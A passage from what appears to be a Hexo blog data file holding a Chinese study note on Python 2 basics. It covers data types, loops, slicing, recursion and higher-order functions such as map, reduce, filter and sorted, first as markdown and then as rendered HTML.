square_of_sum([1, 2, 3, 4, 5])\n```\n\n2. 在python函数的结果中返回多个值的时候其实就是返回了一个`tuple`元组。\n3. 递归函数：在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。\n```\n以经典的汉诺塔问题为例\n# move(n, a, b, c)表示的是有n个盘子在a柱子上，将要移到b柱子上面去\ndef move(n, a, b, c):\n# 如果a柱子上面只有一个盘子，则直接移到c柱子上面去并输出路径，结束递归\n    if n == 1:  \n        print a, '-->', c\n        return\n# 表示的是将n-1的盘子从a柱子上面移到b柱子上面去\n    move(n-1, a, c, b)\n# 输出最下面个盘子移从a移到c的路径\n    print a, '-->', c\n# 将b柱子上面的n-1个盘子移动到c柱子上面\n    move(n-1, b, a, c)\n\nmove(4, 'A', 'B', 'C')\n```\n4. 默认参数只能定义在必需参数的后面：\n```# OK:\ndef fn1(a, b=1, c=2):\n    pass\n# Error:\ndef fn2(a=1, b):\n    pass\n```\n\n## 常用函数 ##\n\n### map()\n高阶函数：map()将列表中的变量遍历并且一一传入第一个参数的函数中进行处理：\n```\n求每个数的平方\ndef f(x):\n    return x*x\nprint map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])\n#[1, 4, 9, 16, 25, 36, 49, 64, 81]\n#注意：map()函数不改变原有的 list，而是返回一个新的 list。\n```\n### reduce()\n高阶函数：相当于传两个参数的map()\n```\n#求乘积\ndef prod(x, y):\n    return x*y\nprint reduce(prod, [2, 4, 5, 7, 12])\n#3360\n```\n### filter()\n高阶函数：filter()，经常用于过滤作用，函数返回的bool为true则保留，为false则丢弃\n```\n#只取1到100中能二次开根结果为整数的值\nimport math\n\ndef is_sqr(x):\n    return math.sqrt(x)%1==0\n\nprint filter(is_sqr, range(1, 101))\n#[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n```\n### 匿名函数 lambda\n\n```\n#简化代码，可以不用专门去定义一些简单的自定义函数\ndef is_not_empty(s):\n    return s and len(s.strip()) > 0\n\nprint filter(is_not_empty, ['test', None, '', 'str', '  ', 'END'])\n#以下代码作用相同\nprint filter(lambda s:s and len(s.strip())>0, ['test', None, '', 'str', '  ', 'END'])\n```\n\n### 返回函数\n\nPython的函数不但可以返回int、str、list、dict等数据类型，还可以返回函数！\n由于可以返回函数，我们在后续代码里就可以决定到底要不要调用该函数。\n```\ndef calc_prod(lst):\n    def lazy_prod():\n        def f(x, y):\n            return x * y\n        return reduce(f, lst)\n    return lazy_prod\nf = calc_prod([1, 2, 3, 4])\nprint f() #适当的延迟调用 可以优化程序运行\n```\n###闭包\n\nhttps://www.imooc.com/code/6059 大致就是返回函数不要引用任何循环变量，或者后续会发生变化的变量。\n```\ndef count():\n    fs = []\n    for i in range(1, 4):\n        def f(j=i):\n            return j*j\n        fs.append(f)\n    return fs\n\nf1, f2, f3 = count()\nprint f1(), f2(), f3()\n```\n\n### cmp()\n\n比较函数，如果x,y是字符串则比较ASCII码的大小\ncmp(...)\n    cmp(x, y) -> integer\n    \n    Return -1 if x<y, 0 if x==y, 1 if x>y.\n\n### sorted()\n依从小到大（如果其中有字符串则比较ASCII码）来对list进行排序的函数，也可以作为高阶函数使用，如下例子\n```\n# 对字符串排序时，有时候忽略大小写排序更符合习惯。请利用sorted()高阶函数，实现忽略大小写排序的算法。\n\n# 输入：['bob', 'about', 'Zoo', 'Credit']\n# 输出：['about', 'bob', 'Credit', 'Zoo']\ndef cmp_ignore_case(s1, s2):\n    return cmp(s1.lower(), s2.lower()) #返回1则将s1往后排\n\nprint sorted(['bob', 'about', 'Zoo', 'Credit'], cmp_ignore_case)\n```\n\n### enumerate()\nenumerate() 函数可以为list建立索引：\n```\n#['Adam', 'Lisa', 'Bart', 'Paul']\n#经过enumerate()变成了类似：\n#[(0, 'Adam'), (1, 'Lisa'), (2, 'Bart'), (3, 'Paul')]\n\nL = ['Adam', 'Lisa', 'Bart', 'Paul']\nfor index, name in enumerate(L):\n     print index, '-', name\n... \n0 - Adam\n1 - Lisa\n2 - Bart\n3 - Paul\n```\n\n### values()方法\ndict 对象有一个 values() 方法，这个方法把dict转换成一个包含所有value的list，这样，我们迭代的就是 dict的每一个 value：\n```\nd = { 'Adam': 95, 'Lisa': 85, 'Bart': 59 }\nprint d.values()\n# [85, 95, 59]\nfor v in d.values():\n    print v\n# 85\n# 95\n# 59\n```\n\n\n","slug":"Pythonѧϰ","published":1,"updated":"2018-12-11T16:10:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjrod1l6n0004143ahym07xbs","content":"<h1 id=\"计划\"><a href=\"#计划\" class=\"headerlink\" title=\"计划\"></a>计划</h1><ol>\n<li>固定学习管道，mooc教程，练习python100例，Python核心编程第二版，廖雪峰python教程。</li>\n<li>熟练python特性，包括变量，条件，循环，数据类型，高阶函数（函数式编程），装饰器，函数式编程，面向对象编程。</li>\n<li>掌握二分、快排算法以及正则表达式。</li>\n<li><p>掌握python常用的标准库、第三方库及常用函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys,os,re,random,base64,md5,urllib,requests,socket,beautifulsoup,...</span><br><span class=\"line\"></span><br><span class=\"line\">map(),reduce(),filter(),lambda,pprint(),...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>多写爬虫，POC，sqlmaptamper，Bruteforce之类的脚本来熟练运用。</p>\n</li>\n<li>看项目写项目 <code>#TODO</code></li>\n</ol>\n<h1 id=\"学习管道\"><a href=\"#学习管道\" class=\"headerlink\" title=\"学习管道\"></a>学习管道</h1><p><a href=\"https://www.imooc.com/learn/317\" target=\"_blank\" rel=\"noopener\">https://www.imooc.com/learn/317</a> 慕课python进阶，可以动手的教程</p>\n<p><a href=\"http://www.runoob.com/python/python-100-examples.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/python/python-100-examples.html</a> python100例</p>\n<p><a href=\"https://wizardforcel.gitbooks.io/core-python-2e/content/\" target=\"_blank\" rel=\"noopener\">https://wizardforcel.gitbooks.io/core-python-2e/content/</a> Python 核心编程 第二版</p>\n<p><a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a> 廖雪峰python3教程（比较深 偏向开发）</p>\n<p><a href=\"http://www.runoob.com/python\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/python</a> 菜鸟教程</p>\n<h1 id=\"查询管道\"><a href=\"#查询管道\" class=\"headerlink\" title=\"查询管道\"></a>查询管道</h1><p><code>help()</code>函数 #查看帮助</p>\n<p><a href=\"https://docs.python.org/3/\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/</a> #官方文档 </p>\n<p><a href=\"http://www.pythondoc.com/pythontutorial3/index.html\" target=\"_blank\" rel=\"noopener\">http://www.pythondoc.com/pythontutorial3/index.html</a> #中文文档 </p>\n<p>其他的就是多google了</p>\n<h1 id=\"变量特点\"><a href=\"#变量特点\" class=\"headerlink\" title=\"变量特点\"></a>变量特点</h1><p>大小写敏感，强类型，不需要声明即可使用（赋值时加上小数点即可变为浮点型，）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10/4 = 2</span><br><span class=\"line\"></span><br><span class=\"line\">10.0/4 = 2.5</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h1><p>list（列表）</p>\n<p>用<code>[]</code>来声明，特点是有序、动态（同一list中可以包含str，int，float，bool多种数据形式）<br><code>foo = [&#39;foo&#39;,100,Ture]</code></p>\n<p>tuple（元组）<br>用<code>()</code>来声明，与list的唯一区别是创建后不可修改。<br>注意：由于<code>()</code>也是规定的优先运算符号，所以创建单元素tuple时需要使用<code>(&quot;foo&quot;,)</code>多加一个<code>,</code>。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#列表生成式一例</span><br><span class=\"line\">print [a*100+b*10+a for a in range(1,10) for b in range(0,10) ]</span><br><span class=\"line\">#生成121，222，232诸如此类3位对称数的列表</span><br></pre></td></tr></table></figure></p>\n<p><strong>dict</strong>ionaries（字典）<br>用<code>{}</code>来声明，如字典其名，是key与value一一映射的数据类型。<br>特点是</p>\n<ol>\n<li>按key查找查找速度快，但占用内存大，与list正好相反。</li>\n<li><p>无序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;</span><br><span class=\"line\">    &apos;Adam&apos;: 95,</span><br><span class=\"line\">    &apos;Lisa&apos;: 85,</span><br><span class=\"line\">    &apos;Bart&apos;: 59</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print(d)</span><br><span class=\"line\">#&#123;&apos;Lisa&apos;: 85, &apos;Adam&apos;: 95, &apos;Bart&apos;: 59&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>key必须是不可变的数据类型，即不能是list。</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;</span><br><span class=\"line\">    [&apos;a&apos;, &apos;b&apos;]: True</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br><span class=\"line\">#TypeError: unhashable type: &apos;list&apos;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>set(组、集合)<br>基本就是只有key没有value的dict，判断元素是否在set中，使用in操作符。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = set([&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Paul&apos;])</span><br><span class=\"line\">L = [&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">for name in L:</span><br><span class=\"line\">    if name in s:</span><br><span class=\"line\">        s.remove(name)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        s.add(name)</span><br><span class=\"line\">print s</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"条件判断和循环\"><a href=\"#条件判断和循环\" class=\"headerlink\" title=\"条件判断和循环\"></a>条件判断和循环</h1><p><strong>注意！判断语句后必须要有<code>:</code>，并且需要特别注意缩进！</strong></p>\n<p><code>if-elif-else</code>的多条件判断。</p>\n<p><code>for-in</code>的迭代遍历循环,可用于多重循环。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#记得提前声明的变量才可以+=</span><br><span class=\"line\">L = range(1,101)</span><br><span class=\"line\">sum = 0</span><br><span class=\"line\">for i in L:</span><br><span class=\"line\">    sum += i*i</span><br><span class=\"line\">print sum</span><br></pre></td></tr></table></figure></p>\n<p><code>while-continue-break</code>条件判断循环，利用break判断结束循环，continue判断跳过这次循环进行下一次循环。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">x = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    x = x + 1</span><br><span class=\"line\">    if x &gt; 100:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    if x%2 == 0:</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    sum += x</span><br><span class=\"line\">print sum</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"切片\"><a href=\"#切片\" class=\"headerlink\" title=\"切片\"></a>切片</h1><p>对有序的数据类型（list,tuple）可以进行切片（slipe）操作：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 以下是pyhon2环境下的结果，因为py2中range()代表了一个List，py3中要使用list(range())才是一个List。</span><br><span class=\"line\">L = range(1, 101)</span><br><span class=\"line\"># 前10个数；</span><br><span class=\"line\"># 3的倍数；</span><br><span class=\"line\"># 不大于50的5的倍数。</span><br><span class=\"line\"># 最后10个数；</span><br><span class=\"line\"># 最后10个5的倍数。</span><br><span class=\"line\">print L[:10] #等同于L[0:10]</span><br><span class=\"line\">print L[2::3] </span><br><span class=\"line\">print L[4:50:5] </span><br><span class=\"line\">print L[-10:]</span><br><span class=\"line\">print L[-46::5]</span><br></pre></td></tr></table></figure></p>\n<p>对字符串的切片：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 利用切片操作完成仅首字母变成大写的自定义函数</span><br><span class=\"line\">def firstCharUpper(s):</span><br><span class=\"line\">    return s[:1].upper()+s[1:]</span><br><span class=\"line\"></span><br><span class=\"line\">print firstCharUpper(&apos;hello&apos;)</span><br><span class=\"line\">print firstCharUpper(&apos;sunday&apos;)</span><br><span class=\"line\">print firstCharUpper(&apos;september&apos;)</span><br><span class=\"line\">#Hello</span><br><span class=\"line\">#Sunday</span><br><span class=\"line\">#September</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><h2 id=\"函数特性\"><a href=\"#函数特性\" class=\"headerlink\" title=\"函数特性\"></a>函数特性</h2><ol>\n<li><p>python中自定义函数对全局变量的引用比较特殊。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">def square_of_sum(L):</span><br><span class=\"line\">    for i in L:</span><br><span class=\"line\">        sum += i*i</span><br><span class=\"line\">    return sum</span><br><span class=\"line\">print square_of_sum([1, 2, 3, 4, 5])</span><br><span class=\"line\"># UnboundLocalError: local variable &apos;sum&apos; referenced before assignment （报错：本地变量sum在赋值之前被引用了</span><br><span class=\"line\"># 说明在def定义函数之前所进行赋值的sum其实没有被引用在def中</span><br><span class=\"line\"># 不推荐使用全局变量，如若真的要使用全局变量可参考下例示范</span><br><span class=\"line\">sum = 0</span><br><span class=\"line\">def square_of_sum(L):</span><br><span class=\"line\">    for i in L:</span><br><span class=\"line\">        global sum</span><br><span class=\"line\">        sum += i*i</span><br><span class=\"line\">    return sum</span><br><span class=\"line\">print square_of_sum([1, 2, 3, 4, 5])</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在python函数的结果中返回多个值的时候其实就是返回了一个<code>tuple</code>元组。</p>\n</li>\n<li><p>递归函数：在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以经典的汉诺塔问题为例</span><br><span class=\"line\"># move(n, a, b, c)表示的是有n个盘子在a柱子上，将要移到b柱子上面去</span><br><span class=\"line\">def move(n, a, b, c):</span><br><span class=\"line\"># 如果a柱子上面只有一个盘子，则直接移到c柱子上面去并输出路径，结束递归</span><br><span class=\"line\">    if n == 1:  </span><br><span class=\"line\">        print a, &apos;--&gt;&apos;, c</span><br><span class=\"line\">        return</span><br><span class=\"line\"># 表示的是将n-1的盘子从a柱子上面移到b柱子上面去</span><br><span class=\"line\">    move(n-1, a, c, b)</span><br><span class=\"line\"># 输出最下面个盘子移从a移到c的路径</span><br><span class=\"line\">    print a, &apos;--&gt;&apos;, c</span><br><span class=\"line\"># 将b柱子上面的n-1个盘子移动到c柱子上面</span><br><span class=\"line\">    move(n-1, b, a, c)</span><br><span class=\"line\"></span><br><span class=\"line\">move(4, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>默认参数只能定义在必需参数的后面：</p>\n<figure class=\"highlight plain\"><figcaption><span>OK:</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def fn1(a, b=1, c=2):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"># Error:</span><br><span class=\"line\">def fn2(a=1, b):</span><br><span class=\"line\">    pass</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><h3 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map()\"></a>map()</h3><p>高阶函数：map()将列表中的变量遍历并且一一传入第一个参数的函数中进行处理：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">求每个数的平方</span><br><span class=\"line\">def f(x):</span><br><span class=\"line\">    return x*x</span><br><span class=\"line\">print map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class=\"line\">#[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br><span class=\"line\">#注意：map()函数不改变原有的 list，而是返回一个新的 list。</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"reduce\"><a href=\"#reduce\" class=\"headerlink\" title=\"reduce()\"></a>reduce()</h3><p>高阶函数：相当于传两个参数的map()<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#求乘积</span><br><span class=\"line\">def prod(x, y):</span><br><span class=\"line\">    return x*y</span><br><span class=\"line\">print reduce(prod, [2, 4, 5, 7, 12])</span><br><span class=\"line\">#3360</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter()\"></a>filter()</h3><p>高阶函数：filter()，经常用于过滤作用，函数返回的bool为true则保留，为false则丢弃<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#只取1到100中能二次开根结果为整数的值</span><br><span class=\"line\">import math</span><br><span class=\"line\"></span><br><span class=\"line\">def is_sqr(x):</span><br><span class=\"line\">    return math.sqrt(x)%1==0</span><br><span class=\"line\"></span><br><span class=\"line\">print filter(is_sqr, range(1, 101))</span><br><span class=\"line\">#[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"匿名函数-lambda\"><a href=\"#匿名函数-lambda\" class=\"headerlink\" title=\"匿名函数 lambda\"></a>匿名函数 lambda</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#简化代码，可以不用专门去定义一些简单的自定义函数</span><br><span class=\"line\">def is_not_empty(s):</span><br><span class=\"line\">    return s and len(s.strip()) &gt; 0</span><br><span class=\"line\"></span><br><span class=\"line\">print filter(is_not_empty, [&apos;test&apos;, None, &apos;&apos;, &apos;str&apos;, &apos;  &apos;, &apos;END&apos;])</span><br><span class=\"line\">#以下代码作用相同</span><br><span class=\"line\">print filter(lambda s:s and len(s.strip())&gt;0, [&apos;test&apos;, None, &apos;&apos;, &apos;str&apos;, &apos;  &apos;, &apos;END&apos;])</span><br></pre></td></tr></table></figure>\n<h3 id=\"返回函数\"><a href=\"#返回函数\" class=\"headerlink\" title=\"返回函数\"></a>返回函数</h3><p>Python的函数不但可以返回int、str、list、dict等数据类型，还可以返回函数！<br>由于可以返回函数，我们在后续代码里就可以决定到底要不要调用该函数。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def calc_prod(lst):</span><br><span class=\"line\">    def lazy_prod():</span><br><span class=\"line\">        def f(x, y):</span><br><span class=\"line\">            return x * y</span><br><span class=\"line\">        return reduce(f, lst)</span><br><span class=\"line\">    return lazy_prod</span><br><span class=\"line\">f = calc_prod([1, 2, 3, 4])</span><br><span class=\"line\">print f() #适当的延迟调用 可以优化程序运行</span><br></pre></td></tr></table></figure></p>\n<p>###闭包</p>\n<p><a href=\"https://www.imooc.com/code/6059\" target=\"_blank\" rel=\"noopener\">https://www.imooc.com/code/6059</a> 大致就是返回函数不要引用任何循环变量，或者后续会发生变化的变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def count():</span><br><span class=\"line\">    fs = []</span><br><span class=\"line\">    for i in range(1, 4):</span><br><span class=\"line\">        def f(j=i):</span><br><span class=\"line\">            return j*j</span><br><span class=\"line\">        fs.append(f)</span><br><span class=\"line\">    return fs</span><br><span class=\"line\"></span><br><span class=\"line\">f1, f2, f3 = count()</span><br><span class=\"line\">print f1(), f2(), f3()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"cmp\"><a href=\"#cmp\" class=\"headerlink\" title=\"cmp()\"></a>cmp()</h3><p>比较函数，如果x,y是字符串则比较ASCII码的大小<br>cmp(…)<br>    cmp(x, y) -&gt; integer</p>\n<pre><code>Return -1 if x&lt;y, 0 if x==y, 1 if x&gt;y.\n</code></pre><h3 id=\"sorted\"><a href=\"#sorted\" class=\"headerlink\" title=\"sorted()\"></a>sorted()</h3><p>依从小到大（如果其中有字符串则比较ASCII码）来对list进行排序的函数，也可以作为高阶函数使用，如下例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对字符串排序时，有时候忽略大小写排序更符合习惯。请利用sorted()高阶函数，实现忽略大小写排序的算法。</span><br><span class=\"line\"></span><br><span class=\"line\"># 输入：[&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;]</span><br><span class=\"line\"># 输出：[&apos;about&apos;, &apos;bob&apos;, &apos;Credit&apos;, &apos;Zoo&apos;]</span><br><span class=\"line\">def cmp_ignore_case(s1, s2):</span><br><span class=\"line\">    return cmp(s1.lower(), s2.lower()) #返回1则将s1往后排</span><br><span class=\"line\"></span><br><span class=\"line\">print sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], cmp_ignore_case)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"enumerate\"><a href=\"#enumerate\" class=\"headerlink\" title=\"enumerate()\"></a>enumerate()</h3><p>enumerate() 函数可以为list建立索引：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#[&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">#经过enumerate()变成了类似：</span><br><span class=\"line\">#[(0, &apos;Adam&apos;), (1, &apos;Lisa&apos;), (2, &apos;Bart&apos;), (3, &apos;Paul&apos;)]</span><br><span class=\"line\"></span><br><span class=\"line\">L = [&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">for index, name in enumerate(L):</span><br><span class=\"line\">     print index, &apos;-&apos;, name</span><br><span class=\"line\">... </span><br><span class=\"line\">0 - Adam</span><br><span class=\"line\">1 - Lisa</span><br><span class=\"line\">2 - Bart</span><br><span class=\"line\">3 - Paul</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"values-方法\"><a href=\"#values-方法\" class=\"headerlink\" title=\"values()方法\"></a>values()方法</h3><p>dict 对象有一个 values() 方法，这个方法把dict转换成一个包含所有value的list，这样，我们迭代的就是 dict的每一个 value：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123; &apos;Adam&apos;: 95, &apos;Lisa&apos;: 85, &apos;Bart&apos;: 59 &#125;</span><br><span class=\"line\">print d.values()</span><br><span class=\"line\"># [85, 95, 59]</span><br><span class=\"line\">for v in d.values():</span><br><span class=\"line\">    print v</span><br><span class=\"line\"># 85</span><br><span class=\"line\"># 95</span><br><span class=\"line\"># 59</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"计划\"><a href=\"#计划\" class=\"headerlink\" title=\"计划\"></a>计划</h1><ol>\n<li>固定学习管道，mooc教程，练习python100例，Python核心编程第二版，廖雪峰python教程。</li>\n<li>熟练python特性，包括变量，条件，循环，数据类型，高阶函数（函数式编程），装饰器，函数式编程，面向对象编程。</li>\n<li>掌握二分、快排算法以及正则表达式。</li>\n<li><p>掌握python常用的标准库、第三方库及常用函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys,os,re,random,base64,md5,urllib,requests,socket,beautifulsoup,...</span><br><span class=\"line\"></span><br><span 